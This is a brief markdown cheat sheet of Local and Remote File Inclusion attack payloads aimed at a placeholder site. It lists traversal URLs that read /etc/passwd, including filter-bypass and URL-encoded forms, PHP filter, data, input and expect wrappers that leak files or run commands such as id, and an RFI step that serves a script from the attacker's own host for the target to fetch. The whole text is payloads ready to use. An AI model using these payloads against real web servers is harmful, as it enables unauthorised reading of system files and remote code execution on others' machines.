# Local File Inclusion Cheat Sheet

## Basic

### Absolute Path

> http://example.com/query?var=/etc/passwd

### Directory Traversal

> http://example.com/query?var=../../../../etc/passwd

> http://example.com/query?var=....//....//....//....//etc/passwd

> http://example.com/query?var=./var/../../../etc/passwd

> http://example.com/query?var=..%2F..%2F..%2F..%2Fetc%2Fpasswd

## Filter

> http://example.com/query?var=php://filter/read=convert.base64-encode/ressource=\<FILE\>

## Wrappers

### data

> http://example.com/query?var=data://text/plain;base64,\<URL\_BASE64\_ENCODED\_SCRIPT\>

### input

Need allow\_url\_include<br>
Give the script as POST data<br>

> http://example.com/query?var=php://input

### Expect

Need expect extension and allow\_url\_include<br>

> http://example.com/query?var=expect://id

## Remote File Inclusion

> python3 -m http.server \<LISTENING\_PORT\>
> http://example.com/query?var=http://\<OUR\_IP\>:\<LISTENING\_PORT\>/\<SCRIPT\>

Same with **FTP**<br>



